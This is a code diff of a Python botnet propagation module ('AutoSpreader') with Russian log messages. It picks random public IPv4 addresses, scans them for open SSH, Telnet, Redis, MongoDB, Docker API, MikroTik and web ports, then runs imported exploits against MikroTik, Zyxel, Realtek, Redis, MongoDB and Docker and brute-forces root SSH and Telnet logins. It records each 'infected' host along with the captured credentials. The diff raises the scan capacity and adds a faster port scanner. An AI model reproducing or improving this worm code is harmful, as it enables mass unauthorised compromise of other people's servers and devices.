@@ -1,7 +1,7 @@
 import asyncio, threading, time, json, os, random, ipaddress, socket, struct, queue
 from botnet.spreader import (
-    ssh_bruteforce, telnet_bruteforce, exploit_eternalblue, exploit_bluekeep,
-    exploit_mikrotik, exploit_zerologon, exploit_redis, exploit_mongodb,
+    ssh_bruteforce, telnet_bruteforce,
+    exploit_mikrotik, exploit_redis, exploit_mongodb,
     exploit_docker_api, exploit_zyxel, exploit_realtek, add_bot
 )
 from botnet.target_collector import fetch_targets
@@ -19,7 +19,7 @@ class AutoSpreader:
         self.message_queue = queue.Queue()
         self.stats = {'scanned':0, 'infected':0, 'open_ports':0}
         self.scanned_ips = set()
-        self.max_targets = 5000
+        self.max_targets = 50000
         self.load_settings(settings_file)
         self.load_scanned_ips()
 
@@ -31,7 +31,7 @@ class AutoSpreader:
             s = {}
         self.enabled = s.get("auto_spread_enabled", True)
         self.interval = s.get("auto_spread_interval_min", 0.5) * 60
-        self.worker_threads = s.get("spread_worker_threads", 2000)
+        self.worker_threads = s.get("spread_worker_threads", 3000)
         self.use_shodan = s.get("use_shodan", True)
         self.shodan_api = None
         try:
@@ -59,7 +59,7 @@ class AutoSpreader:
         self.stats = {'scanned':0, 'infected':0, 'open_ports':0}
         self.thread = threading.Thread(target=self._worker, daemon=True)
         self.thread.start()
-        self.message_queue.put("[System] INFECTION WAVE запущен")
+        self.message_queue.put("[System] LIGHTSPEED запущен (встроенный сканер)")
 
     def pause(self):
         self.paused = True
@@ -72,40 +72,56 @@ class AutoSpreader:
         self.save_scanned_ips()
         self.message_queue.put(f"[System] Стоп. Заражено: {self.stats['infected']}")
 
-    async def attack_target(self, ip):
-        ports = await ssh_bruteforce.__globals__['quick_port_scan'](
-            ip, [22,23,445,3389,8291,6379,27017,2375,2323,2222,80,443,8080], timeout=0.2
-        )
-        if not ports:
-            return False
-        self.stats['open_ports'] += 1
+    async def scan_ports_async(self, ips, ports, max_workers=3000):
+        results = {}
+        sem = asyncio.Semaphore(max_workers)
+        lock = asyncio.Lock()
+        async def scan_one(ip):
+            open_ports = []
+            for port in ports:
+                try:
+                    sock = socket.socket()
+                    sock.settimeout(0.05)
+                    if sock.connect_ex((ip, port)) == 0:
+                        open_ports.append(port)
+                    sock.close()
+                except:
+                    pass
+            if open_ports:
+                async with lock:
+                    results[ip] = open_ports
+        async def worker(ip):
+            async with sem:
+                await scan_one(ip)
+        tasks = [asyncio.create_task(worker(ip)) for ip in ips]
+        await asyncio.gather(*tasks)
+        return results
+
+    async def attack_target(self, ip, ports):
         self.message_queue.put(f"[Ports] {ip} открыты: {ports}")
         if 8291 in ports and await exploit_mikrotik(ip):
-            self.stats['infected'] += 1; return True
+            self.stats['infected'] += 1; self.message_queue.put(f"[Infected] {ip} (MikroTik)"); return True
         if 80 in ports:
             if await exploit_zyxel(ip):
-                self.stats['infected'] += 1; return True
+                self.stats['infected'] += 1; self.message_queue.put(f"[Infected] {ip} (Zyxel)"); return True
             if await exploit_realtek(ip):
-                self.stats['infected'] += 1; return True
+                self.stats['infected'] += 1; self.message_queue.put(f"[Infected] {ip} (Realtek)"); return True
         if 6379 in ports and await exploit_redis(ip):
-            self.stats['infected'] += 1; return True
+            self.stats['infected'] += 1; self.message_queue.put(f"[Infected] {ip} (Redis)"); return True
         if 27017 in ports and await exploit_mongodb(ip):
-            self.stats['infected'] += 1; return True
+            self.stats['infected'] += 1; self.message_queue.put(f"[Infected] {ip} (MongoDB)"); return True
         if 2375 in ports and await exploit_docker_api(ip):
-            self.stats['infected'] += 1; return True
+            self.stats['infected'] += 1; self.message_queue.put(f"[Infected] {ip} (Docker)"); return True
         for p in [23,2323]:
             if p in ports:
-                if (await telnet_bruteforce(ip, p))[0]:
-                    self.stats['infected'] += 1; return True
+                success, cred = await telnet_bruteforce(ip, p)
+                if success:
+                    self.stats['infected'] += 1; self.message_queue.put(f"[Infected] {ip} (Telnet {cred})"); return True
         for p in [22,2222]:
             if p in ports:
-                if (await ssh_bruteforce(ip, 'root', p))[0]:
-                    self.stats['infected'] += 1; return True
-        if 445 in ports:
-            if any(await asyncio.gather(exploit_eternalblue(ip), exploit_zerologon(ip))):
-                self.stats['infected'] += 1; return True
-        if 3389 in ports and await exploit_bluekeep(ip):
-            self.stats['infected'] += 1; return True
+                success, cred = await ssh_bruteforce(ip, 'root', p)
+                if success:
+                    self.stats['infected'] += 1; self.message_queue.put(f"[Infected] {ip} (SSH {cred})"); return True
         return False
 
     def _worker(self):
@@ -132,7 +148,7 @@ class AutoSpreader:
                         target_ips.append(ip)
                         self.scanned_ips.add(ip)
             if not target_ips:
-                for _ in range(min(500, self.max_targets)):
+                for _ in range(min(1000, self.max_targets)):
                     ip = str(ipaddress.IPv4Address(random.randint(0x01000000, 0xDFFFFFFF)))
                     if ip not in self.scanned_ips:
                         target_ips.append(ip)
@@ -141,15 +157,29 @@ class AutoSpreader:
                 time.sleep(self.interval)
                 continue
             self.stats['scanned'] += len(target_ips)
-            self.message_queue.put(f"[Scan] {len(target_ips)} целей (всего просканировано: {self.stats['scanned']})")
+            self.message_queue.put(f"[Scan] {len(target_ips)} целей (всего: {self.stats['scanned']})")
+            scan_result = loop.run_until_complete(
+                self.scan_ports_async(target_ips, [22,23,445,3389,8291,6379,27017,2375,2323,2222,80,443,8080])
+            )
+            if not scan_result:
+                self.message_queue.put("[Scan] Нет открытых портов")
+                time.sleep(self.interval)
+                continue
+            self.stats['open_ports'] += len(scan_result)
             sem = asyncio.Semaphore(self.worker_threads)
-            tasks = [self.attack_target(ip) for ip in target_ips]
+            completed = 0
+            total = len(scan_result)
+            async def attack(ip):
+                nonlocal completed
+                async with sem:
+                    await self.attack_target(ip, scan_result[ip])
+                    completed += 1
+                    if completed % max(1, total//20) == 0:
+                        pct = int(completed/total*100)
+                        self.message_queue.put(f"[Progress] ({pct}%)")
+            tasks = [attack(ip) for ip in scan_result]
             loop.run_until_complete(asyncio.gather(*tasks))
             self.message_queue.put(f"[Stats] Проверено: {self.stats['scanned']} | Заражено: {self.stats['infected']}")
-            # Автосохранение лога? Не здесь, но можно добавить событие
-            if self.force_cycle:
-                self.force_cycle = False
-                self.message_queue.put("[Auto] Принудительный цикл завершён")
             time.sleep(self.interval)
 
     def scan_once(self, target_list):
@@ -161,7 +191,13 @@ class AutoSpreader:
     def _scan_once_worker(self, target_list):
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
-        sem = asyncio.Semaphore(min(self.worker_threads, len(target_list)))
-        tasks = [self.attack_target(ip) for ip in target_list]
+        scan_result = loop.run_until_complete(
+            self.scan_ports_async(target_list, [22,23,445,3389,8291,6379,27017,2375,2323,2222,80,443,8080])
+        )
+        if not scan_result:
+            self.message_queue.put("[Завершено] Нет открытых портов")
+            return
+        sem = asyncio.Semaphore(min(self.worker_threads, len(scan_result)))
+        tasks = [self.attack_target(ip, ports) for ip, ports in scan_result.items()]
         loop.run_until_complete(asyncio.gather(*tasks))
         self.message_queue.put(f"[Завершено] Обработано {len(target_list)} целей")
